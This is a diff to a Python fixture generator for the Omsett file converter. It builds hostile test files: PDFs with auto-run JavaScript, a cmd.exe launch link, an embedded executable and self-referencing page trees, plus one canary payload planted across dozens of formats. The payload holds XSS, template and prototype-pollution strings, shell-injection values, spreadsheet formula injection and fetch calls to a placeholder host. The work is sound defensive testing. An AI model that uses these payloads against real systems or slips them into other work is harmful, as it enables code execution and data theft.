@@ -3367,6 +3367,288 @@ script(
     "drafter", node="succeeds", mismatch=True,
 )
 
+# --- PDF ------------------------------------------------------------------------------------------
+# A PDF can carry a program to run when it is opened, links that start programs, files attached
+# inside it, and a password. Its pages are a tree that can point back at itself, and its
+# streams are packed and can unpack to anything. And it can be "tagged" in a way that tells
+# nothing, or that covers its pictures and none of its words. Each is converted to HTML.
+G = "pdf"
+NOT_PDF = "This file is not a valid PDF"
+PDF_SAMPLE = sample("pdf/sample.pdf")
+PDF_PLAIN = sample("pdf/untagged.pdf")
+PDF_FONT = b"<< /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>"
+
+
+def pdf_of(objects, trailer=b""):
+    """A PDF from numbered objects, with a true table of where each one is."""
+    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
+    offsets = {}
+    for number in sorted(objects):
+        offsets[number] = len(out)
+        out += b"%d 0 obj\n" % number + objects[number] + b"\nendobj\n"
+    size = max(objects) + 1
+    start = len(out)
+    out += b"xref\n0 %d\n0000000000 65535 f \n" % size
+    for number in range(1, size):
+        out += (b"%010d 00000 n \n" % offsets[number]) if number in offsets else b"0000000000 65535 f \n"
+    return bytes(out + b"trailer\n<< /Size %d /Root 1 0 R %s>>\nstartxref\n%d\n%%%%EOF\n" % (size, trailer, start))
+
+
+def stream_of(data, extra=b""):
+    return b"<< /Length %d %s>>\nstream\n" % (len(data), extra) + data + b"\nendstream"
+
+
+WORDS = b"BT /F1 12 Tf 72 720 Td (An ordinary page of words, long enough to be a paragraph.) Tj ET\n"
+
+
+def one_page(catalog=b"", page=b"", content=WORDS, more=None, trailer=b""):
+    objects = {
+        1: b"<< /Type /Catalog /Pages 2 0 R %s>>" % catalog,
+        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R %s>>" % (PDF_FONT, page),
+        4: stream_of(content),
+    }
+    objects.update(more or {})
+    return pdf_of(objects, trailer)
+
+
+def pdf_trap(name, data, why, detect, **more):
+    trap(name, data, why, detect, group=G, **more)
+
+
+pdf_trap(
+    "truncated.pdf",
+    PDF_SAMPLE[: len(PDF_SAMPLE) // 3],
+    "A PDF cut off a third of the way in. The table that says where its parts are is at the "
+    "end, and the end is gone.",
+    "pdf", node="fails", note=NOT_PDF,
+)
+pdf_trap(
+    "runs-a-script-when-opened.pdf",
+    one_page(catalog=b"/OpenAction << /S /JavaScript /JS (app.alert\\('opened'\\); this.submitForm\\('http://elsewhere.example/'\\);) >> /Names << /JavaScript << /Names [(a) << /S /JavaScript /JS (app.alert\\(2\\)) >>] >> >> "),
+    "A PDF with a program to run the moment it is opened, and another kept by name. Nothing in "
+    "a PDF is run, and neither is carried into the page.",
+    "pdf", node="succeeds", absent="app.alert",
+)
+pdf_trap(
+    "links-that-start-programs.pdf",
+    one_page(
+        page=b"/Annots [5 0 R 6 0 R 7 0 R] ",
+        more={
+            5: b"<< /Type /Annot /Subtype /Link /Rect [72 716 300 732] /A << /S /Launch /F (C:\\\\Windows\\\\System32\\\\cmd.exe) >> >>",
+            6: b"<< /Type /Annot /Subtype /Link /Rect [72 700 300 716] /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>",
+            7: b"<< /Type /Annot /Subtype /Link /Rect [72 684 300 700] /A << /S /GoToR /F (\\\\\\\\elsewhere.example\\\\share\\\\x.pdf) >> >>",
+        },
+    ),
+    "Three links: one that starts a program on the computer, one whose address is a script, "
+    "and one that opens a file on another machine, which tells that machine who is asking.",
+    "pdf", node="succeeds", absent="cmd.exe",
+)
+pdf_trap(
+    "file-attached-inside.pdf",
+    one_page(
+        catalog=b"/Names << /EmbeddedFiles << /Names [(invoice.exe) 5 0 R] >> >> ",
+        more={5: b"<< /Type /Filespec /F (invoice.exe) /EF << /F 6 0 R >> >>", 6: stream_of(b"MZ SECRET-ATTACHMENT")},
+    ),
+    "A PDF with another file attached inside it, here a program named like an invoice. "
+    "Attachments are not read.",
+    "pdf", node="succeeds", absent="SECRET-ATTACHMENT",
+)
+pdf_trap(
+    "locked-with-a-password.pdf",
+    one_page(trailer=b"/Encrypt << /Filter /Standard /V 1 /R 2 /O <%s> /U <%s> /P -64 >> /ID [<00112233445566778899aabbccddeeff> <00112233445566778899aabbccddeeff>] " % (b"ab" * 32, b"cd" * 32)),
+    "A PDF that says it is locked with a password.",
+    "pdf", node="fails", note="This PDF is protected by a password, which Omsett cannot open",
+)
+pdf_trap(
+    "pictures-of-pages.pdf",
+    one_page(content=b"0.5 g 72 100 468 620 re f\n"),
+    "A page that is a picture and no words, as a scan is. There is nothing to read, and the "
+    "reason is given.",
+    "pdf", node="fails",
+    note="This PDF has no text in it. It may be a scan: pictures of pages, which Omsett cannot read the words in yet",
+)
+pdf_trap(
+    "claims-a-billion-pages.pdf",
+    pdf_of({
+        1: b"<< /Type /Catalog /Pages 2 0 R >>",
+        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1000000000 >>",
+        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R >>" % PDF_FONT,
+        4: stream_of(WORDS),
+    }),
+    "One page, in a file that says it has a billion. The figure is not believed: the pages "
+    "that are there are counted, and there is one.",
+    "pdf", node="succeeds",
+)
+pdf_trap(
+    "pages-inside-themselves.pdf",
+    pdf_of({
+        1: b"<< /Type /Catalog /Pages 2 0 R >>",
+        2: b"<< /Type /Pages /Kids [2 0 R 3 0 R 2 0 R] /Count 3 >>",
+        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R >>" % PDF_FONT,
+        4: stream_of(WORDS),
+    }),
+    "A list of pages that holds itself, twice. A reader that walks the list without noticing "
+    "walks it for ever.",
+    "pdf", node="fails", note=NOT_PDF,
+)
+pdf_trap(
+    "tagged-for-its-pictures-only.pdf",
+    one_page(
+        catalog=b"/MarkInfo << /Marked true >> /StructTreeRoot 5 0 R ",
+        page=b"/StructParents 0 ",
+        content=b"/Figure << /MCID 0 >> BDC\n0.8 g 72 430 120 60 re f 0 g\nEMC\n" + WORDS,
+        more={
+            5: b"<< /Type /StructTreeRoot /K [6 0 R] /ParentTree 7 0 R >>",
+            6: b"<< /Type /StructElem /S /Figure /P 5 0 R /Pg 3 0 R /K [0] /Alt (A chart) >>",
+            7: b"<< /Nums [0 [6 0 R]] >>",
+        },
+    ),
+    "A PDF that is tagged, but only for its picture: its words are in no tag. Read by its tags "
+    "alone it would come out as the picture's description and nothing else. The tags are not "
+    "believed, and the words are read from the page.",
+    "pdf", node="succeeds", absent="[Picture: A chart]",
+)
+deep = {
+    1: b"<< /Type /Catalog /Pages 2 0 R /MarkInfo << /Marked true >> /StructTreeRoot 5 0 R >>",
+    2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+    3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R /StructParents 0 >>" % PDF_FONT,
+    4: stream_of(b"/P << /MCID 0 >> BDC\n" + WORDS + b"EMC\n"),
+    5: b"<< /Type /StructTreeRoot /K [10 0 R] /ParentTree 6 0 R >>",
+    6: b"<< /Nums [0 [5009 0 R]] >>",
+}
+for i in range(5000):
+    deep[10 + i] = b"<< /Type /StructElem /S /%s /P %d 0 R /Pg 3 0 R /K [%s] >>" % (b"P" if i == 4999 else b"Sect", 5 if i == 0 else 9 + i, b"0" if i == 4999 else b"%d 0 R" % (11 + i))
+pdf_trap(
+    "tags-five-thousand-deep.pdf",
+    pdf_of(deep),
+    "One paragraph inside five thousand sections, each inside the last. Tags nested past any "
+    "that describe a document are not followed, and the words are read from the page.",
+    "pdf", node="succeeds",
+)
+pdf_trap(
+    "first-line-only.pdf",
+    b"%PDF-1.7\n" + bytes(random.Random(11).randrange(256) for _ in range(4000)),
+    "The line a PDF opens with, and four thousand bytes of noise.",
+    "pdf", node="fails", note=NOT_PDF,
+)
+pdf_trap(
+    "picture-named.pdf",
+    GOOD,
+    "A PNG with a .pdf name.",
+    "png", node="succeeds", mismatch=True,
+)
+pdf_trap(
+    "report-named.txt",
+    PDF_PLAIN,
+    "A sound PDF with a .txt name.",
+    "pdf", node="succeeds", mismatch=True,
+)
+
+# --- code: the same payload, planted in every format ----------------------------------------------
+# One adversarial payload, put wherever a format holds text. If any part of it ever ran, in the
+# page, in the worker or in Node, it would leave a mark the tests look for after every trap:
+#
+#   a global named __omsett_canary;   a property on every object (prototype pollution);
+#   a file at /tmp/omsett-canary;     a dialog;     a request to another site.
+#
+# Each of these files is also converted to every format its kind can become
+# (fixtures/code-traps.test.ts), and no result may hold a live script.
+G = "code"
+MARK = "globalThis.__omsett_canary=1"
+SHELL = "touch /tmp/omsett-canary"
+CANARY = (
+    '"><script>%s;alert("omsett-canary");fetch("http://canary.invalid/x")</script>'
+    '<img src=x onerror="%s"><svg onload="%s"></svg><iframe src="javascript:%s"></iframe>'
+    " ${%s} {{constructor.constructor('%s')()}} <%%= %s %%> #{%s}"
+    " $(%s) `%s` ;%s; | %s && %s"
+    " javascript:%s //"
+) % ((MARK,) * 8 + (SHELL,) * 5 + (MARK,))
+CB = CANARY.encode()
+XML_CANARY = CANARY.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").encode()
+
+
+def code(name, data, why, detect, **more):
+    trap(name, data, why, detect, group=G, **more)
+
+
+WHY = "The adversarial payload %s. Nothing in it may run, here or in any format this becomes."
+J = json.dumps(CANARY)
+
+code("code.json", ('{"__proto__": {"polluted": true}, "constructor": {"prototype": {"polluted": true}}, "note": %s, %s: "as a name"}\n' % (J, J)).encode(),
+     WHY % "as a value and as a name, beside names that mean something to JavaScript", "json", node="succeeds")
+code("code.jsonl", ('{"__proto__": {"polluted": true}, "note": %s}\n{"note": "second line"}\n' % J).encode(),
+     WHY % "in a line of JSON Lines", "jsonl", node="succeeds")
+code("code.yaml", ("note: %s\nrun: !!js/function 'function(){%s}'\nshell: !!python/object/apply:os.system ['%s']\n__proto__:\n  polluted: true\n" % (J, MARK, SHELL)).encode(),
+     WHY % "as a value, with two tags that ask the reader to build a function and to run a command", "yaml", node="succeeds")
+code("code.toml", ('note = %s\n\n[__proto__]\npolluted = true\n' % J).encode(),
+     WHY % "as a value, beside a table named __proto__", "toml", node="succeeds")
+code("code.xml", b'<?xml version="1.0"?>\n<?xml-stylesheet href="javascript:' + MARK.encode() + b'"?>\n<notes><note onclick="' + XML_CANARY + b'">' + XML_CANARY + b"</note><script>" + MARK.encode() + b"</script></notes>\n",
+     WHY % "as text and as an attribute, with a script tag and a stylesheet that is code", "xml", node="succeeds")
+code("names-that-pollute.xml", b"<notes><__proto__><polluted>true</polluted></__proto__><constructor><prototype><polluted>true</polluted></prototype></constructor></notes>\n",
+     "Tags named for the parts of JavaScript that every object shares. A reader that builds objects from tag names would change every object there is. The reader refuses the names.", "xml", node="fails", note="This file is not valid XML")
+quoted = '"' + CANARY.replace('"', '""') + '"'
+code("code.csv", ('name,note,__proto__\n%s,%s,polluted\n"=cmd|\' /C %s\'!A0","=WEBSERVICE(""http://canary.invalid/"")",x\n' % (quoted, quoted, SHELL)).encode(),
+     WHY % "in cells, beside two formulas a spreadsheet would run", "csv", node="succeeds")
+code("code.tsv", ("name\tnote\n%s\t%s\n" % (CANARY.replace("\t", " "), "second")).encode(),
+     WHY % "in a cell", "tsv", node="succeeds")
+esc = CANARY.replace("\\", "\\\\").replace(";", "\\;").replace(",", "\\,")
+code("code.vcf", ("BEGIN:VCARD\r\nVERSION:3.0\r\nFN:%s\r\nEMAIL:%s\r\nNOTE:%s\r\nEND:VCARD\r\n" % (esc, esc, esc)).encode(),
+     WHY % "as a contact's name, address and note", "vcf", node="succeeds")
+code("code.ics", ("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\nUID:1\r\nDTSTART:20261123T090000Z\r\nSUMMARY:%s\r\nLOCATION:%s\r\nDESCRIPTION:%s\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n" % (esc, esc, esc)).encode(),
+     WHY % "as an event's title, place and description", "ics", node="succeeds")
+code("code.xlsx", book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "name") + text_cell("B1", "__proto__") + '</row><row r="2">' + text_cell("A2", XML_CANARY.decode()) + text_cell("B2", "polluted") + '<c r="C2"><f>' + XML_CANARY.decode() + "</f><v>0</v></c></row>")}),
+     WHY % "in a cell and in a formula, beside a column named __proto__", "xlsx", node="succeeds")
+
+one_line = CANARY.replace("-->", "- ->")
+code("code.srt", ("1\n00:00:01,000 --> 00:00:04,000\n%s\n" % one_line).encode(), WHY % "as a subtitle", "srt", node="succeeds", absent="<script")
+code("code.vtt", ("WEBVTT\n\n00:00:01.000 --> 00:00:04.000\n%s\n" % one_line).encode(), WHY % "as a subtitle", "vtt", node="succeeds", absent="<script")
+code("code.ass", ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,," + one_line.encode() + b"\n", WHY % "as a line of dialogue", "ass", node="succeeds", absent="<script")
+code("code.ssa", SSA_HEAD + b"Dialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,," + one_line.encode() + b"\n", WHY % "as a line of dialogue", "ssa", node="succeeds", absent="<script")
+code("code.sbv", ("0:00:01.000,0:00:04.000\n%s\n" % one_line).encode(), WHY % "as a caption", "sbv", node="succeeds", absent="<script")
+code("code.lrc", ("[00:01.00]%s\n[00:04.00]\n" % one_line).encode(), WHY % "as a line of lyrics", "lrc", node="succeeds", absent="<script")
+TTML_HEAD = b'<?xml version="1.0" encoding="UTF-8"?>\n<tt xmlns="http://www.w3.org/ns/ttml">\n<body><div>\n'
+code("code.ttml", TTML_HEAD + b'<p begin="1s" end="4s" onclick="' + XML_CANARY + b'">' + XML_CANARY + b"</p>\n</div></body>\n</tt>\n", WHY % "as a subtitle and as an attribute", "ttml", node="succeeds", absent="<script")
+code("code.smi", b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC>" + CB + b"\n<SYNC Start=4000><P Class=ENCC>&nbsp;\n</BODY>\n</SAMI>\n", WHY % "as a caption, in a format written like a web page", "smi", node="succeeds", absent="<script")
+code("code.sub", ("{25}{100}%s\n" % one_line.replace("|", "/")).encode(), WHY % "as a subtitle", "microdvd", node="succeeds", absent="<script")
+
+code("code.md", ("# %s\n\n%s\n\n[a link](javascript:%s) ![a picture](javascript:%s)\n\n```\n%s\n```\n" % (CANARY, CANARY, MARK, MARK, CANARY)).encode(),
+     WHY % "as a heading, a paragraph, a link, a picture and a block of code", "md", node="succeeds", absent="<script")
+code("code.html", b"<!doctype html>\n<html><head><title>" + CB + b"</title><script>" + MARK.encode() + b"</script></head><body onload=\"" + MARK.encode() + b"\"><h1>Title</h1><p>" + CB + b'</p><a href="javascript:' + MARK.encode() + b'">link</a><p>' + XML_CANARY + b"</p></body></html>\n",
+     WHY % "as markup that is live, and again as text", "html", node="succeeds", absent="<script>" + MARK)
+code("code.docx", doc({"word/document.xml": body_of(words(XML_CANARY.decode()) + '<w:p><w:hyperlink r:id="rId4"><w:r><w:t>a link</w:t></w:r></w:hyperlink></w:p>'),
+                       "word/_rels/document.xml.rels": RELS.replace(b"https://omsett.com", b"javascript:" + MARK.encode())}),
+     WHY % "as a paragraph, with a link whose address is a script", "docx", node="succeeds", absent="<script>" + MARK)
+code("code.pptx", deck({"ppt/slides/slide1.xml": FIRST.replace(b"Omsett", XML_CANARY, 1),
+                        "ppt/slides/_rels/slide2.xml.rels": DECK["ppt/slides/_rels/slide2.xml.rels"].replace(b"https://omsett.com", b"javascript:" + MARK.encode())}),
+     WHY % "as a slide's title, with a link whose address is a script", "pptx", node="succeeds", absent="<script>" + MARK)
+pdf_text = CANARY.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)").encode("latin-1")
+code("code.pdf", one_page(catalog=b"/OpenAction << /S /JavaScript /JS (" + MARK.encode() + b") >> ", content=b"BT /F1 9 Tf 20 720 Td (" + pdf_text + b") Tj ET\n" + WORDS.replace(b"720", b"700")),
+     WHY % "as words on the page, with a program to run on opening", "pdf", node="succeeds", absent="<script>" + MARK)
+
+code("code.fountain", ("Title: %s\n\nINT. ROOM - DAY\n\n%s\n\nADA\n%s\n" % (one_line, CANARY, one_line)).encode(), WHY % "as the title, a line of action and a line of dialogue", "fountain", node="succeeds")
+code("code.fdx", b'<?xml version="1.0"?>\n<FinalDraft><Content><Paragraph Type="Action" onclick="' + XML_CANARY + b'"><Text>' + XML_CANARY + b"</Text></Paragraph><script>" + MARK.encode() + b"</script></Content></FinalDraft>\n",
+     WHY % "as a line of action and as an attribute, with a script tag", "fdx", node="succeeds")
+code("code.drafter", package({"title": CANARY, "__proto__": {"polluted": True}, "constructor": {"prototype": {"polluted": True}}}, files={"Omsett.fountain": ("INT. ROOM - DAY\n\n%s\n" % CANARY).encode()}),
+     WHY % "in the script and in the manifest, beside names that mean something to JavaScript", "drafter", node="succeeds")
+
+svg_code = b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="40" onload="' + XML_CANARY + b'"><script>' + MARK.encode() + b';alert(1)</script><rect width="64" height="40" fill="#3b6cff"/><text x="2" y="20" font-size="6">' + XML_CANARY + b'</text><a href="javascript:' + MARK.encode() + b'"><rect width="9" height="9"/></a><foreignObject width="9" height="9"><body xmlns="http://www.w3.org/1999/xhtml" onload="' + XML_CANARY + b'"/></foreignObject></svg>\n'
+code("code.svg", svg_code, WHY % "as a script, as handlers, as a link, and as text", "svg", node="succeeds", absent="omsett_canary")
+JPEG_SAMPLE = sample("jpeg/sample.jpg")
+code("code.jpg", JPEG_SAMPLE[:2] + b"\xff\xfe" + struct.pack(">H", len(CB) + 2) + CB + JPEG_SAMPLE[2:],
+     WHY % "in the comment a JPEG may carry", "jpeg", node="succeeds", absent="omsett_canary")
+GIF_SAMPLE = sample("gif/sample.gif")
+code("code.gif", GIF_SAMPLE[:-1] + b"\x21\xfe" + bytes([len(CB[:250])]) + CB[:250] + b"\x00" + GIF_SAMPLE[-1:],
+     WHY % "in the comment a GIF may carry", "gif", node="succeeds", absent="omsett_canary")
+code("code.ttf", sfnt([(tag, data + CB if tag == b"name" else data) for tag, data in TT]),
+     WHY % "in the table that holds a font's name. A font is carried across table by table, so it is still there afterwards, as bytes that nothing reads as code", "ttf", node="succeeds")
+
+names = [b"$(%s).txt" % SHELL.encode(), b"`%s`.txt" % SHELL.encode(), b"; %s ;.sh" % SHELL.encode(), b"__proto__", b"constructor", b"<img src=x onerror=alert(1)>.html", b"run.sh", b"index.html"]
+members = [{"name": n, "data": CB, "mode": 0o100755} for n in names]
+code("code.zip", zip_of(members, comment=CB[:200]), WHY % "as the contents of every file, with files named as commands, as markup, and as names that mean something to JavaScript, all marked as programs", "zip", node="succeeds")
+code("code.tar", tar_of(*[(tar_header(n[:99], len(CB), mode=0o755), CB) for n in names]), WHY % "as the contents of every file, with files named as commands and marked as programs", "tar", node="succeeds")
+code("code.tar.gz", gz(tar_of(*[(tar_header(n[:99], len(CB), mode=0o755), CB) for n in names])), WHY % "the same, squeezed", "tgz", node="succeeds")
+
 with open(os.path.join(OUT, "manifest.json"), "w") as out:
     json.dump(manifest, out, indent=2)
     out.write("\n")
